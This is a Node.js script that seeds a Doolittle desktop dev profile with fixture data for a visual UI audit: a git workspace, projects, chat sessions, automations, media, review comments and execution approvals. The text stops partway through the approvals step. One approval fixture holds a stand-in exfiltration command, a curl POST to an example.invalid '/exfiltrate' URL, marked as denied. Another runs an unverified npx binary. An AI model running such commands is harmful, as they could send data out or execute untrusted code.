#!/usr/bin/env node
/**
 * seed-visual-audit.mjs — populate a Doolittle desktop dev profile with rich,
 * populated-state fixture data so the desktop UI can be visually audited.
 *
 * DEV-ONLY. Never run this against a real profile: the script refuses unless
 * the profile path contains "desktop-dev" (override with --force if you really
 * know what you are doing).
 *
 * Usage:
 *   node scripts/seed-visual-audit.mjs [--api URL] [--profile PATH] [--clean]
 *                                      [--force] [--dry-run] [--help]
 *
 * Typical flow:
 *   1. Start the desktop dev backend with CDP enabled:
 *        DOOLITTLE_OFFLINE_BOOTSTRAP=true nub run desktop:dev -- --remote-debugging-port=9223
 *   2. In another shell:
 *        node scripts/seed-visual-audit.mjs
 *      The API URL is discovered by evaluating window.doolittle.getBackendState()
 *      over CDP at http://127.0.0.1:9223. Alternatively pass --api http://127.0.0.1:PORT.
 *   3. Reload the desktop app and audit the populated surfaces.
 *
 * Discovery notes:
 *   CDP evaluation uses Node's built-in WebSocket client against the DevTools
 *   HTTP endpoint — deliberately NOT playwright-core, because closing a
 *   playwright CDP connection can terminate the attached Electron browser.
 *   Raw CDP only ever sends Runtime.evaluate and then drops the socket.
 *
 * What gets seeded (all names/ids carry an `audit` marker):
 *   - A git fixture workspace with committed, modified, staged, and untracked
 *     files (for review/diff surfaces) at <profile>/../visual-audit-fixture.
 *   - Projects + project resources (POST /projects, /projects/:id/resources).
 *   - Sessions via POST /sessions/import: a 121-message scrollback, a markdown
 *     gauntlet (tables, code, diffs, unbroken strings, unicode/emoji,
 *     attachment metadata), and a minimal two-message chat.
 *   - Automations (POST /cron/jobs): scheduled, manual, typed run-agent, and a
 *     paused job; a few manual triggers produce run history.
 *   - Media library assets (POST /media/generate, /media/speak) — offline the
 *     runtime falls back to generated SVG artifacts.
 *   - Review record comments (POST /review-record/comments) — note the scope is
 *     computed from the runtime's CURRENT workspace repository, so comments
 *     attach to whatever repo the dev runtime is pointed at.
 *   - Execution approvals JSON at runtime/gateway/approvals (filesystem write;
 *     the store re-reads the file on every access, so this is safe while the
 *     backend is running). Mix of pending/approved/denied/expired/used.
 *   - Runtime log lines appended to runtime/logs/doolittle.jsonl.
 *
 * Idempotency:
 *   - Projects, resources, review comments: deterministic ids; existing
 *     entities are skipped (server dedupes or the script checks first).
 *   - Sessions: import is NOT idempotent server-side, so the script lists
 *     sessions first and skips any audit title that already exists. --clean
 *     cannot remove imported sessions (no delete route); re-seeding a profile
 *     that already has them is a no-op for sessions.
 *   - Cron jobs: matched by name; skipped when present. --clean deletes them.
 *   - Media: matched by asset name prefix; skipped when present.
 *   - Approvals: audit records are replaced wholesale each run (idempotent).
 *   - Logs: appended once — a marker line is checked before appending.
 *   - The git fixture is recreated deterministically each run.
 *
 * Deliberately avoided: direct sqlite/pglite writes (projections end up
 * inconsistent) and named-bot automation targets (they require approvals).
 */

import { execFileSync } from "node:child_process";
import {
  appendFileSync,
  existsSync,
  mkdirSync,
  readFileSync,
  renameSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { dirname, join, resolve } from "node:path";

const CDP_ENDPOINT = "http://127.0.0.1:9223";
const SESSION_TITLES = {
  long: "Audit — long scrollback archaeology",
  markdown: "Audit — markdown rendering gauntlet",
  minimal: "Audit — minimal exchange",
};

// ---------------------------------------------------------------------------
// CLI args
// ---------------------------------------------------------------------------

function parseArgs(argv) {
  const args = {
    api: undefined,
    profile: undefined,
    clean: false,
    force: false,
    dryRun: false,
    help: false,
  };
  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--help" || arg === "-h") args.help = true;
    else if (arg === "--clean") args.clean = true;
    else if (arg === "--force") args.force = true;
    else if (arg === "--dry-run") args.dryRun = true;
    else if (arg === "--api") {
      index += 1;
      args.api = argv[index];
    } else if (arg === "--profile") {
      index += 1;
      args.profile = argv[index];
    } else if (arg.startsWith("--api=")) args.api = arg.slice("--api=".length);
    else if (arg.startsWith("--profile="))
      args.profile = arg.slice("--profile=".length);
    else throw new Error(`Unknown argument: ${arg}`);
  }
  return args;
}

function printHelp() {
  console.log(`node scripts/seed-visual-audit.mjs [options]

Populate a desktop dev profile with visual-audit fixture data (dev-only).

Options:
  --api URL        Backend API base URL (e.g. http://127.0.0.1:4317).
                   When omitted, discovered via CDP at ${CDP_ENDPOINT}.
  --profile PATH   Dev profile directory. Default: <cwd>/var/desktop-dev/profile.
  --clean          Best-effort removal of seeded entities before seeding
                   (cron jobs are deleted; sessions/media cannot be removed
                   through the API and are skipped on reseed instead).
  --force          Override the desktop-dev profile safety check.
  --dry-run        Print the plan without writing anything.
  --help           Show this message.`);
}

// ---------------------------------------------------------------------------
// Console helpers
// ---------------------------------------------------------------------------

const icons = { ok: "✓", skip: "–", fail: "✗", step: "▸" };
function step(message) {
  console.log(`\n${icons.step} ${message}`);
}
function ok(message) {
  console.log(`  ${icons.ok} ${message}`);
}
function skip(message) {
  console.log(`  ${icons.skip} ${message}`);
}
function fail(message) {
  console.error(`  ${icons.fail} ${message}`);
}

// ---------------------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------------------

async function api(apiBase, path, method = "GET", body) {
  const response = await fetch(`${apiBase}${path}`, {
    method,
    headers: body !== undefined ? { "content-type": "application/json" } : {},
    body: body !== undefined ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(30_000),
  });
  const text = await response.text();
  let payload;
  try {
    payload = text ? JSON.parse(text) : {};
  } catch {
    payload = { raw: text };
  }
  return { status: response.status, payload };
}

async function apiStrict(apiBase, path, method = "GET", body) {
  const { status, payload } = await api(apiBase, path, method, body);
  if (status < 200 || status >= 300) {
    throw new Error(
      `${method} ${path} failed: HTTP ${status} ${JSON.stringify(payload).slice(0, 300)}`,
    );
  }
  return payload;
}

// ---------------------------------------------------------------------------
// CDP discovery (raw WebSocket — never closes the attached browser)
// ---------------------------------------------------------------------------

async function evaluateCdp(wsUrl, expression) {
  const socket = new WebSocket(wsUrl);
  let counter = 0;
  const pending = new Map();
  try {
    await new Promise((resolveOpen, rejectOpen) => {
      const timer = setTimeout(
        () => rejectOpen(new Error("CDP WebSocket open timed out")),
        5_000,
      );
      socket.addEventListener("open", () => {
        clearTimeout(timer);
        resolveOpen();
      });
      socket.addEventListener("error", () => {
        clearTimeout(timer);
        rejectOpen(new Error("CDP WebSocket connection failed"));
      });
    });
    socket.addEventListener("message", (event) => {
      const message = JSON.parse(String(event.data));
      if (message.id && pending.has(message.id)) {
        pending.get(message.id)(message);
        pending.delete(message.id);
      }
    });
    const send = (method, params) =>
      new Promise((resolveSend, rejectSend) => {
        const timer = setTimeout(
          () => rejectSend(new Error(`${method} timed out`)),
          10_000,
        );
        counter += 1;
        pending.set(counter, (message) => {
          clearTimeout(timer);
          resolveSend(message);
        });
        socket.send(JSON.stringify({ id: counter, method, params }));
      });
    const evaluation = await send("Runtime.evaluate", {
      expression,
      returnByValue: true,
      awaitPromise: true,
    });
    return evaluation?.result?.result?.value;
  } finally {
    try {
      socket.close();
    } catch {
      // Socket already closed; nothing to do.
    }
  }
}

async function discoverApiUrl(cdpEndpoint) {
  const version = await fetch(`${cdpEndpoint}/json/version`, {
    signal: AbortSignal.timeout(3_000),
  })
    .then((response) => (response.ok ? response.json() : null))
    .catch(() => null);
  if (!version) {
    throw new Error(
      `No CDP endpoint at ${cdpEndpoint}. Start the dev desktop with --remote-debugging-port=9223 or pass --api.`,
    );
  }
  const targets = await fetch(`${cdpEndpoint}/json/list`, {
    signal: AbortSignal.timeout(3_000),
  }).then((response) => response.json());
  const pageTargets = targets.filter(
    (target) => target.type === "page" && target.webSocketDebuggerUrl,
  );
  for (const target of pageTargets) {
    let state;
    try {
      state = await evaluateCdp(
        target.webSocketDebuggerUrl,
        "window.doolittle?.getBackendState?.()",
      );
    } catch {
      continue;
    }
    if (state?.url) return state.url;
  }
  throw new Error(
    `CDP is up at ${cdpEndpoint}, but no page exposed getBackendState().url — is the dev desktop backend ready?`,
  );
}

// ---------------------------------------------------------------------------
// Git fixture workspace
// ---------------------------------------------------------------------------

function fixtureGit(workspace, ...args) {
  return execFileSync(
    "git",
    [
      "-C",
      workspace,
      "-c",
      "user.name=Visual Audit",
      "-c",
      "user.email=visual-audit@localhost",
      "-c",
      "commit.gpgsign=false",
      "-c",
      "core.hooksPath=/dev/null",
      ...args,
    ],
    { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
  );
}

function seedGitFixture(fixtureDir) {
  if (existsSync(fixtureDir)) rmSync(fixtureDir, { recursive: true });
  mkdirSync(join(fixtureDir, "src"), { recursive: true });
  writeFileSync(
    join(fixtureDir, "src", "engine.ts"),
    "export function auditEngine() {\n  return 'committed baseline';\n}\n",
  );
  writeFileSync(
    join(fixtureDir, "src", "helpers.ts"),
    "export const auditHelper = true;\n",
  );
  writeFileSync(
    join(fixtureDir, "README.md"),
    "# Visual audit fixture\n\nCommitted baseline content.\n",
  );
  fixtureGit(fixtureDir, "init", "-qb", "main");
  fixtureGit(fixtureDir, "add", "--", ".");
  fixtureGit(fixtureDir, "commit", "-qm", "Baseline for the visual audit");

  // Modified (unstaged)
  writeFileSync(
    join(fixtureDir, "README.md"),
    "# Visual audit fixture\n\nCommitted baseline content.\n\nThis line is modified in the working tree but not staged.\n",
  );
  // Staged
  writeFileSync(
    join(fixtureDir, "src", "engine.ts"),
    "export function auditEngine() {\n  return 'staged revision with a longer implementation body';\n}\n\nexport const stagedAddition = 'new export staged for review';\n",
  );
  fixtureGit(fixtureDir, "add", "--", "src/engine.ts");
  // Untracked
  writeFileSync(
    join(fixtureDir, "notes-untracked.md"),
    "# Untracked notes\n\nThis file has never been committed.\n",
  );
  mkdirSync(join(fixtureDir, "scratch"), { recursive: true });
  writeFileSync(
    join(fixtureDir, "scratch", "ephemeral-draft.txt"),
    "Draft content in an untracked directory.\n",
  );
}

// ---------------------------------------------------------------------------
// Seed content builders
// ---------------------------------------------------------------------------

function longUnbroken(length) {
  return "x7Qw9Zk2".repeat(Math.ceil(length / 8)).slice(0, length);
}

function buildLongScrollbackArchive() {
  const messages = [];
  const baseTime = Date.UTC(2025, 8, 14, 9, 0, 0);
  for (let index = 0; index < 121; index += 1) {
    const role = index % 2 === 0 ? "user" : "assistant";
    const createdAt = new Date(baseTime + index * 7 * 60_000).toISOString();
    const message = {
      id: `audit-long-${index}`,
      role,
      createdAt,
      text:
        index === 0
          ? `Seedmarker unbrokenstring follows: ${longUnbroken(480)}`
          : role === "user"
            ? `Turn ${index + 1}: can you keep going on the archive migration?`
            : `Turn ${index + 1}: continuing — batch ${Math.floor(index / 2)} of the migration is outlined below.`,
    };
    if (index === 0) {
      message.attachments = [
        {
          id: "audit-attachment-scrollback",
          name: "migration-notes-very-long-filename-for-truncation-audit.txt",
          kind: "document",
          mimeType: "text/plain",
          sizeBytes: 481_516,
          sha256: "a".repeat(64),
        },
      ];
    }
    if (index === 42) {
      message.attachments = [
        {
          id: "audit-attachment-image",
          name: "topology-sketch.png",
          kind: "image",
          mimeType: "image/png",
          sizeBytes: 91_204,
          sha256: "b".repeat(64),
        },
      ];
    }
    messages.push(message);
  }
  return {
    schema: "doolittle.session.archive",
    version: 1,
    manifest: {
      exportedAt: new Date(Date.UTC(2025, 8, 15)).toISOString(),
      messageCount: messages.length,
      attachmentCount: 2,
      omissions: [],
    },
    source: {
      application: "visual-audit-seed",
      sessionId: "audit-long-scrollback",
    },
    session: { title: SESSION_TITLES.long },
    messages,
  };
}

function buildMarkdownArchive() {
  const at = (minutes) =>
    new Date(Date.UTC(2025, 10, 2, 14, minutes)).toISOString();
  const messages = [
    {
      id: "audit-md-1",
      role: "user",
      createdAt: at(0),
      text: "Show me every markdown edge case you can render. Include tables, code, diffs, and unicode. 🧪🚀",
    },
    {
      id: "audit-md-2",
      role: "assistant",
      createdAt: at(1),
      text: [
        "# Heading one",
        "",
        "## Heading two with `inline code`",
        "",
        "### Heading three",
        "",
        "> A blockquote spanning",
        "> two lines with **bold** inside.",
        "",
        "- Unordered item",
        "- Second item",
        "  - Nested child",
        "    - Deeply nested grandchild",
        "",
        "1. Ordered first",
        "2. Ordered second",
        "",
        "| Surface | State | Notes |",
        "| ------- | ----- | ----- |",
        "| Automations | populated | 4 jobs, mixed triggers |",
        "| Review | populated | comments across hunks |",
        "| Media | populated | offline SVG fallback |",
        "",
        "```ts",
        "export function parseAuditTrail(input: string): AuditTrail {",
        "  const rows = input.split('\\n').filter(Boolean);",
        "  return { rows, confident: rows.length > 3 };",
        "}",
        "```",
        "",
        "```diff",
        "- const seeding = 'manual and error prone';",
        "+ const seeding = 'scripts/seed-visual-audit.mjs';",
        "  const audience = 'visual auditors';",
        "+ const coverage = ['automations', 'review', 'activity', 'sessions', 'media'];",
        "```",
        "",
        "```python",
        "def audit(surface):",
        '    return f"{surface} is populated ✓"',
        "```",
        "",
        "A very long unbroken token follows on the next line.",
        "",
        longUnbroken(600),
        "",
        "Unicode gauntlet: café — naïve — CJK \u65e5\u672c\u8a9e\u30c6\u30b9\u30c8 — emoji 👩‍💻🔥🌈 — combining marks a͐̓̕ — RTL مرحبا — math ∑∫π.",
        "",
        "Trailing link: [Doolittle repository](https://example.invalid/doolittle) and autolink-ish https://example.invalid/plain.",
      ].join("\n"),
    },
    {
      id: "audit-md-3",
      role: "user",
      createdAt: at(2),
      text: "One more thing — what does a very short reply look like?",
    },
    {
      id: "audit-md-4",
      role: "assistant",
      createdAt: at(3),
      text: "Short.",
    },
    {
      id: "audit-md-5",
      role: "user",
      createdAt: at(4),
      text: "And an empty-ish code fence plus a giant single-line message?",
    },
    {
      id: "audit-md-6",
      role: "assistant",
      createdAt: at(5),
      text: `\`\`\`json\n{}\n\`\`\`\n\n${"Single-line paragraph without line breaks. ".repeat(24)}`,
    },
  ];
  return {
    schema: "doolittle.session.archive",
    version: 1,
    manifest: {
      exportedAt: new Date(Date.UTC(2025, 10, 2, 15)).toISOString(),
      messageCount: messages.length,
      attachmentCount: 0,
      omissions: [],
    },
    source: {
      application: "visual-audit-seed",
      sessionId: "audit-markdown-gauntlet",
    },
    session: { title: SESSION_TITLES.markdown },
    messages,
  };
}

function buildMinimalArchive() {
  return {
    schema: "doolittle.session.archive",
    version: 1,
    manifest: {
      exportedAt: new Date().toISOString(),
      messageCount: 2,
      attachmentCount: 0,
      omissions: [],
    },
    source: { application: "visual-audit-seed", sessionId: "audit-minimal" },
    session: { title: SESSION_TITLES.minimal },
    messages: [
      {
        id: "audit-min-1",
        role: "user",
        createdAt: new Date().toISOString(),
        text: "Hi.",
      },
      {
        id: "audit-min-2",
        role: "assistant",
        createdAt: new Date().toISOString(),
        text: "Hello.",
      },
    ],
  };
}

function buildCronSeeds() {
  return [
    {
      key: "digest",
      body: {
        name: "audit-nightly-digest",
        trigger: { type: "schedule", schedule: "0 9 * * *" },
        action: {
          type: "prompt",
          prompt:
            "Summarize yesterday's audit activity into a short digest with headings and a table.",
        },
        delivery: "local",
      },
    },
    {
      key: "manual",
      body: {
        name: "audit-manual-cleanup",
        trigger: { type: "manual" },
        action: {
          type: "run-agent",
          prompt:
            "Sweep the audit fixture workspace and report anything untracked.",
        },
        delivery: "local",
      },
    },
    {
      key: "paused",
      body: {
        name: "audit-paused-sync",
        schedule: "*/15 * * * *",
        prompt: "Sync the audit fixture notes into the project knowledge base.",
        skills: [],
        delivery: "local",
      },
    },
    {
      key: "legacy",
      body: {
        name: "audit-legacy-simple-heartbeat",
        schedule: "0 */6 * * *",
        prompt:
          "Heartbeat check with a very long prompt body that exercises wrapping in automation cards: verify the fixture surfaces, the fixtures, and the audit trails are all present and accounted for before reporting completion.",
        skills: [],
        delivery: "local",
      },
    },
  ];
}

function buildApprovalSeeds() {
  const now = Date.now();
  const iso = (offset) => new Date(now + offset).toISOString();
  const base = {
    platform: "api",
    userId: "audit-operator",
    roomId: "audit-room",
  };
  return [
    {
      ...base,
      id: "audit-appr-pending-recent",
      command: "git push origin audit-fixture",
      reason:
        "The automation wants to publish the visual audit fixture branch.",
      createdAt: iso(-5 * 60_000),
      expiresAt: iso(55 * 60_000),
      status: "pending",
    },
    {
      ...base,
      id: "audit-appr-pending-long",
      command:
        "rm -rf ./node_modules/.cache && pnpm install --frozen-lockfile && pnpm rebuild better-sqlite3 --verbose",
      reason:
        "A very long pending approval reason that should wrap across multiple lines in the approvals surface so text truncation and layout can be audited properly.",
      createdAt: iso(-12 * 60_000),
      expiresAt: iso(48 * 60_000),
      status: "pending",
    },
    {
      ...base,
      id: "audit-appr-approved",
      command: "git commit -m 'audit fixture commit'",
      reason:
        "Committing seed content inside the disposable fixture workspace.",
      createdAt: iso(-3 * 3_600_000),
      expiresAt: iso(-2 * 3_600_000 + 50 * 60_000),
      approvedAt: iso(-3 * 3_600_000 + 4 * 60_000),
      status: "approved",
    },
    {
      ...base,
      id: "audit-appr-denied",
      command: "curl -X POST https://example.invalid/exfiltrate",
      reason: "Outbound request denied during the audit rehearsal.",
      createdAt: iso(-26 * 3_600_000),
      expiresAt: iso(-25 * 3_600_000),
      deniedAt: iso(-26 * 3_600_000 + 9 * 60_000),
      status: "denied",
    },
    {
      ...base,
      id: "audit-appr-expired",
      command: "npx some-unverified-binary --run",
      reason: "Operator never responded before the expiry window elapsed.",
      createdAt: iso(-50 * 3_600_000),
      expiresAt: iso(-49 * 3_600_000),
      status: "expired",
    },
    {
      ...base,
      id: "audit-appr-used",
      command: "git clean -fdx scratch/",
      reason: "One-shot cleanup that was approved and already consumed.",
      createdAt: iso(-75 * 3_600_000),
      expiresAt: iso(-74 * 3_600_000),
      approvedAt: iso(-75 * 3_600_000 + 2 * 60_000),
      usedAt: iso(-75 * 3_600_000 + 6 * 60_000),
      status: "used",
    },
  ];
}

function buildLogSeeds() {
  const now = Date.now();
  const rows = [
    {
      at: new Date(now - 90_000).toISOString(),
      level: "error",
      scope: "audit-seed",
      message:
        "Runtime failure recorded (audit seed): simulated provider timeout while generating summary",
    },
    {
      at: new Date(now - 60_000).toISOString(),
      level: "warn",
      scope: "audit-seed",
      message:
        "Audit seed warning: media generation fell back to offline SVG output",
    },
    {
      at: new Date(now - 30_000).toISOString(),
      level: "info",
      scope: "audit-seed",
      message:
        "Audit seed info: visual audit fixture content is present in this profile",
    },
    {
      at: new Date(now - 5_000).toISOString(),
      level: "debug",
      scope: "audit-seed",
      message: `Audit seed debug with a long unbroken token ${longUnbroken(220)}`,
    },
  ];
  return rows;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

async function main() {
  const args = parseArgs(process.argv.slice(2));
  if (args.help) {
    printHelp();
    return;
  }

  const profile = resolve(
    args.profile ?? join(process.cwd(), "var", "desktop-dev", "profile"),
  );
  if (!profile.includes("desktop-dev") && !args.force) {
    throw new Error(
      `Refusing to seed: profile "${profile}" does not look like a desktop-dev profile. Pass --force only if you are certain.`,
    );
  }
  const runtimeDir = join(profile, "runtime");
  const fixtureDir = join(dirname(profile), "visual-audit-fixture");

  console.log("seed-visual-audit: dev-only populated-state fixture seeder");
  console.log(`  profile:  ${profile}`);
  console.log(`  fixture:  ${fixtureDir}`);
  if (args.dryRun) console.log("  mode:     dry-run (no writes)");

  // --- Resolve the API base URL -------------------------------------------
  let apiBase = args.api?.replace(/\/+$/, "");
  if (!apiBase) {
    step(`Discovering backend API via CDP at ${CDP_ENDPOINT}`);
    try {
      apiBase = await discoverApiUrl(CDP_ENDPOINT);
      ok(`discovered ${apiBase}`);
    } catch (error) {
      if (!args.dryRun) throw error;
      skip(
        `discovery unavailable (${error instanceof Error ? error.message : String(error)}) — continuing dry run`,
      );
    }
  }
  if (apiBase) {
    const health = await api(apiBase, "/health").catch(() => null);
    if (!health || health.status >= 400) {
      if (!args.dryRun) {
        throw new Error(
          `Backend not reachable at ${apiBase} — is the desktop dev runtime running?`,
        );
      }
      skip(`backend at ${apiBase} not reachable — continuing dry run`);
    } else {
      ok(`backend healthy at ${apiBase}`);
    }
  }

  if (args.dryRun) {
    step("Dry run plan");
    for (const line of [
      "recreate git fixture workspace (committed/modified/staged/untracked)",
      "create 2 projects with resources (deterministic ids)",
      "import 3 sessions (121-message scrollback, markdown gauntlet, minimal)",
      "create 4 automations, pause one, trigger 3 runs",
      "generate 2 images + 1 speech asset (offline SVG fallback)",
      "post 5 review record comments",
      "write 6 execution approvals (pending/approved/denied/expired/used)",
      "append 4 runtime log lines",
      "run the verification pass over every projection",
    ]) {
      console.log(`  - ${line}`);
    }
    return;
  }

  // --- --clean -------------------------------------------------------------
  if (args.clean) {
    step("Cleaning previously seeded entities (best effort)");
    const { jobs } = await apiStrict(apiBase, "/cron/jobs");
    for (const job of jobs ?? []) {
      if (typeof job.name === "string" && job.name.startsWith("audit-")) {
        await apiStrict(apiBase, `/cron/jobs/${job.id}`, "DELETE");
        ok(`deleted cron job ${job.name}`);
      }
    }
    skip(
      "sessions/media/projects cannot be deleted through the API; existing ones are skipped during seeding",
    );
  }

  // --- Git fixture workspace ------------------------------------------------
  step("Creating git fixture workspace");
  seedGitFixture(fixtureDir);
  ok(`fixture ready at ${fixtureDir} (committed, modified, staged, untracked)`);

  // --- Projects -------------------------------------------------------------
  step("Seeding projects");
  const projectsPayload = await apiStrict(
    apiBase,
    "/projects?includeArchived=true",
  );
  const existingProjects = new Set(
    (projectsPayload.projects ?? []).map((project) => project.id),
  );
  const projectSeeds = [
    {
      id: "audit-proj-cartographer",
      name: "Cartographer — audit fixture",
      description:
        "Fixture project bound to the visual audit git workspace. Long description for layout auditing: the cartographer project charts imaginary coastlines, reviews hand-drawn contour diffs, and exercises every populated surface in the desktop client.",
      instructions:
        "Prefer concise answers. Reference the audit fixture when asked.",
      color: "#5b8def",
      icon: "map",
      pinned: true,
      primaryPath: fixtureDir,
    },
    {
      id: "audit-proj-quiet-harbor",
      name: "Quiet harbor — unpinned with ünïcode ø",
      description:
        "\u3002 unpinned, no resources bound — intentionally sparse.",
      color: "#b065d8",
      icon: "anchor",
      pinned: false,
    },
  ];
  for (const seed of projectSeeds) {
    if (existingProjects.has(seed.id)) {
      skip(`project ${seed.id} already exists`);
      continue;
    }
    const { status, payload } = await api(apiBase, "/projects", "POST", seed);
    if (status === 409) skip(`project ${seed.id} already exists`);
    else if (status >= 300)
      throw new Error(
        `project ${seed.id} failed: HTTP ${status} ${JSON.stringify(payload)}`,
      );
    else ok(`created project ${seed.id}`);
  }

  step("Seeding project resources");
  const resourceSeeds = [
    {
      projectId: "audit-proj-cartographer",
      resource: {
        id: "audit-res-note",
        kind: "note",
        label: "Audit reading — populated states checklist",
        value:
          "Automations, review, activity, sessions, and media must all render populated content for the audit.",
      },
    },
    {
      projectId: "audit-proj-cartographer",
      resource: {
        id: "audit-res-folder",
        kind: "folder",
        label: "Audit fixture workspace",
        value: fixtureDir,
      },
    },
    {
      projectId: "audit-proj-cartographer",
      resource: {
        id: "audit-res-file",
        kind: "file",
        label: "Modified README inside the fixture",
        value: join(fixtureDir, "README.md"),
      },
    },
    {
      projectId: "audit-proj-cartographer",
      resource: {
        id: "audit-res-link",
        kind: "link",
        label:
          "A link with a very long label that will need truncation somewhere in the UI",
        value: "https://example.invalid/visual-audit/cartographer",
      },
    },
  ];
  for (const { projectId, resource } of resourceSeeds) {
    const { status, payload } = await api(
      apiBase,
      `/projects/${projectId}/resources`,
      "POST",
      resource,
    );
    if (status === 409) skip(`resource ${resource.id} already exists`);
    else if (status >= 300)
      throw new Error(
        `resource ${resource.id} failed: HTTP ${status} ${JSON.stringify(payload)}`,
      );
    else ok(`added resource ${resource.id}`);
  }

  // --- Sessions -------------------------------------------------------------
  step("Seeding sessions via archive import");
  const sessionsPayload = await apiStrict(apiBase, "/sessions?limit=500");
  const existingTitles = new Set(
    (sessionsPayload.sessions ?? [])
      .map((session) => session.title)
      .filter(Boolean),
  );
  const archives = [
    { title: SESSION_TITLES.long, archive: buildLongScrollbackArchive() },
    { title: SESSION_TITLES.markdown, archive: buildMarkdownArchive() },
    { title: SESSION_TITLES.minimal, archive: buildMinimalArchive() },
  ];
  for (const { title, archive } of archives) {
    if (existingTitles.has(title)) {
      skip(`session "${title}" already imported`);
      continue;
    }
    const result = await apiStrict(apiBase, "/sessions/import", "POST", {
      projectId: "audit-proj-cartographer",
      archive,
    });
    ok(
      `imported "${title}" (${result.imported?.importedMessageCount ?? archive.messages.length} messages)`,
    );
  }

  // --- Automations ----------------------------------------------------------
  step("Seeding automations");
  const { jobs: existingJobs } = await apiStrict(apiBase, "/cron/jobs");
  const jobsByName = new Map(
    (existingJobs ?? []).map((job) => [job.name, job]),
  );
  const cronSeeds = buildCronSeeds();
  const seededJobs = new Map();
  for (const seed of cronSeeds) {
    const existing = jobsByName.get(seed.body.name);
    if (existing) {
      skip(`automation ${seed.body.name} already exists`);
      seededJobs.set(seed.key, existing);
      continue;
    }
    const result = await apiStrict(apiBase, "/cron/jobs", "POST", seed.body);
    if (!result.job)
      throw new Error(`cron create returned no job for ${seed.body.name}`);
    seededJobs.set(seed.key, result.job);
    ok(`created automation ${seed.body.name}`);
  }
  const pausedJob = seededJobs.get("paused");
  if (pausedJob && pausedJob.status !== "paused") {
    await apiStrict(apiBase, `/cron/jobs/${pausedJob.id}/pause`, "POST", {});
    ok("paused automation audit-paused-sync");
  }
  step("Triggering automation runs");
  for (const key of ["manual", "digest", "manual"]) {
    const job = seededJobs.get(key);
    if (!job) continue;
    const { status, payload } = await api(
      apiBase,
      `/cron/jobs/${job.id}/trigger`,
      "POST",
      {},
    );
    if (status >= 300) {
      skip(
        `trigger for ${job.name} returned HTTP ${status} (runs may still be recorded) — ${JSON.stringify(payload).slice(0, 120)}`,
      );
    } else {
      ok(`triggered ${job.name}`);
    }
  }

  // --- Media ----------------------------------------------------------------
  step("Seeding media library");
  const library = await apiStrict(apiBase, "/media/library").catch(() => ({
    assets: [],
  }));
  const existingAssets = new Set(
    (library.assets ?? []).map((asset) => asset.name),
  );
  const mediaSeeds = [
    {
      path: "/media/generate",
      body: {
        prompt:
          "A topographic contour map of an imaginary coastline, blueprint style, fine lines",
        name: "audit-topographic-contours",
        size: "1024x1024",
        style: "blueprint",
      },
      match: "audit-topographic-contours",
    },
    {
      path: "/media/generate",
      body: {
        prompt:
          "Un paysage imaginaire avec des îles flottantes — unicode prompt gauntlet — \u30a4\u30e1\u30fc\u30b8\u3001\u5c71\u3001\u6d77、",
        name: "audit-floating-islands",
        size: "1024x1024",
        style: "watercolor",
      },
      match: "audit-floating-islands",
    },
    {
      path: "/media/speak",
      body: {
        text: "This is an audit voice memo. The media surface should render populated content.",
        name: "audit-voice-memo",
        format: "svg",
      },
      match: "audit-voice-memo",
    },
  ];
  for (const seed of mediaSeeds) {
    const already = [...existingAssets].some((name) =>
      name.startsWith(seed.match),
    );
    if (already) {
      skip(`media asset ${seed.match} already exists`);
      continue;
    }
    const { status, payload } = await api(
      apiBase,
      seed.path,
      "POST",
      seed.body,
    );
    if (status >= 300) {
      skip(
        `media seed ${seed.match} failed (HTTP ${status}) — offline fallback may differ: ${JSON.stringify(payload).slice(0, 140)}`,
      );
    } else {
      ok(`created media asset ${seed.match}`);
    }
  }

  // --- Review record comments -------------------------------------------------
  // NOTE: the server computes the review scope from the runtime's CURRENT
  // workspace repository (root/branch/head). The git fixture is final at this
  // point, so comments land on whatever repo the dev runtime is pointed at.
  step("Seeding review record comments");
  const commentSeeds = [
    {
      id: "audit-comment-1",
      path: "src/engine.ts",
      body: "This staged revision changes the return literal — worth a second look before the audit sign-off. **Markdown** in comment bodies should render too.",
      createdAt: new Date(Date.now() - 2 * 3_600_000).toISOString(),
      anchor: {
        side: "new",
        line: 2,
        preview: "return 'staged revision with a longer implementation body';",
      },
    },
    {
      id: "audit-comment-2",
      path: "src/engine.ts",
      body: "A much longer review comment designed to exercise wrapping behavior in the review surface. The engine export gained a sibling constant in this revision; consider whether the audit trail wants both exported from the barrel module, or whether the helper surface should stay minimal. Wrapping, scrolling, and hunk anchoring all need exercised edges.",
      createdAt: new Date(Date.now() - 90 * 60_000).toISOString(),
      anchor: {
        side: "new",
        line: 5,
        preview:
          "export const stagedAddition = 'new export staged for review';",
      },
    },
    {
      id: "audit-comment-3",
      path: "README.md",
      body: "Unstaged wording tweak — the added line lands in the working tree only. Short comment.",
      createdAt: new Date(Date.now() - 45 * 60_000).toISOString(),
      anchor: {
        side: "new",
        line: 5,
        preview: "This line is modified in the working tree but not staged.",
      },
    },
    {
      id: "audit-comment-4",
      path: "README.md",
      body: "Old-side anchor example: the baseline heading still reads like a placeholder. Unicode check — café \u30b3\u30f3\u30d1\u30a4\u30e9 👩‍💻.",
      createdAt: new Date(Date.now() - 30 * 60_000).toISOString(),
      anchor: { side: "old", line: 1, preview: "# Visual audit fixture" },
    },
    {
      id: "audit-comment-5",
      path: "src/helpers.ts",
      body: `Unbroken token stress inside a review comment: ${longUnbroken(180)}`,
      createdAt: new Date(Date.now() - 10 * 60_000).toISOString(),
      anchor: {
        side: "new",
        line: 1,
        preview: "export const auditHelper = true;",
      },
    },
  ];
  for (const comment of commentSeeds) {
    const { status, payload } = await api(
      apiBase,
      "/review-record/comments",
      "POST",
      { comment },
    );
    if (status >= 300) {
      skip(
        `review comment ${comment.id} failed (HTTP ${status}): ${JSON.stringify(payload).slice(0, 120)}`,
      );
    } else {
      ok(`posted review comment ${comment.id}`);
    }
  }

  // --- Execution approvals (filesystem) ---------------------------------------
  step("Writing execution approvals");
  const approvalsDir = join(runtimeDir, "gateway", "approvals");
  mkdirSync(approvalsDir, { recursive: true });
  const approvalsPath = join(approvalsDir, "execution-approvals.json");
  let existingApprovals = [];
  if (existsSync(approvalsPath)) {
    try {
      existingApprovals =
        JSON.parse(readFileSync(approvalsPath, "utf8")).approvals ?? [];
    } catch {
      existingApprovals = [];
    }
  }
